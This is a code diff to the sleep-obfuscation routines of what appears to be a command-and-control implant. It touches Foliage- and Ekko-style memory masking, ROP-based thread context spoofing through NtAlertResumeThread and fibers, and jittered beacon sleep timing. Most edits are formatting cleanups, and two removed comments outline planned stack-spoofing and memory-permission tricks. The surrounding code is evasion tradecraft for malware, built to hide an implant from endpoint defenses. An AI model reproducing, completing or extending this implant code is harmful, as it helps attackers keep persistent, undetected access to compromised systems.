@@ -247,9 +247,6 @@ VOID FoliageObf( PSLEEP_PARAM Param )
 
                     if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( hThread, NULL ) ) )
                     {
-                        // TODO: true stack spoofing: [ Current.NtTib = Random.NtTib ] ==> [ Suspend current thread -> copy ctx of the rand thread to the current thread -> set & resume ]
-                        // TODO: change base addr to rx and here the sections to rw
-
                         RopSpoof->ContextFlags = CONTEXT_FULL;
                         RopSpoof->Rip = U_PTR( Instance.Win32.WaitForSingleObjectEx );
                         RopSpoof->Rsp = U_PTR( Instance.Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
@@ -379,8 +376,9 @@ VOID EkkoObf( DWORD TimeOut )
     USTRING Key          = { 0 };
     USTRING Img          = { 0 };
 
-    for ( SHORT i = 0; i < 16; i++ )
+    for ( SHORT i = 0; i < 16; i++ ) {
         KeyBuf[ i ] = RandomNumber32( );
+    }
 
     ImageBase   = Instance.Session.ModuleBase;
     ImageSize   = IMAGE_SIZE( Instance.Session.ModuleBase );
@@ -470,8 +468,9 @@ VOID EkkoObf( DWORD TimeOut )
     }
 }
 
-UINT32 SleepTime( VOID )
-{
+UINT32 SleepTime(
+    VOID
+) {
     UINT32     SleepTime    = Instance.Config.Sleeping * 1000;
     UINT32     MaxVariation = ( Instance.Config.Jitter * SleepTime ) / 100;
     ULONG      Rand         = 0;
@@ -522,27 +521,29 @@ UINT32 SleepTime( VOID )
     {
         Rand = RandomNumber32();
         Rand = Rand % MaxVariation;
-        if ( RandomBool() )
+
+        if ( RandomBool() ) {
             SleepTime += Rand;
-        else
+        } else {
             SleepTime -= Rand;
+        }
     }
 
     return SleepTime;
 }
 
-VOID SleepObf( VOID )
-{
-    UINT32 TimeOut = SleepTime();
+VOID SleepObf(
+    VOID
+) {
+    UINT32 TimeOut   = SleepTime();
+    DWORD  Technique = Instance.Config.Implant.SleepMaskTechnique;
 
-    DWORD Technique = Instance.Config.Implant.SleepMaskTechnique;
-
-    /* dont do any sleep obf. waste of resources */
-    if ( TimeOut == 0 )
+    /* don't do any sleep obf. waste of resources */
+    if ( TimeOut == 0 ) {
         return;
+    }
 
-    if ( Instance.Threads )
-    {
+    if ( Instance.Threads ) {
         PRINTF( "Can't sleep obf. Threads running: %d\n", Instance.Threads )
         Technique = 0;
     }
@@ -553,9 +554,9 @@ VOID SleepObf( VOID )
         {
             SLEEP_PARAM Param = { 0 };
 
-            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, NULL ) ) )
+            if ( ( Param.Master = Instance.Win32.ConvertThreadToFiberEx( &Param, 0 ) ) )
             {
-                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, NULL, NULL, FoliageObf, &Param ) ) )
+                if ( ( Param.Slave = Instance.Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) )
                 {
                     Param.TimeOut = TimeOut;
                     Instance.Win32.SwitchToFiber( Param.Slave );
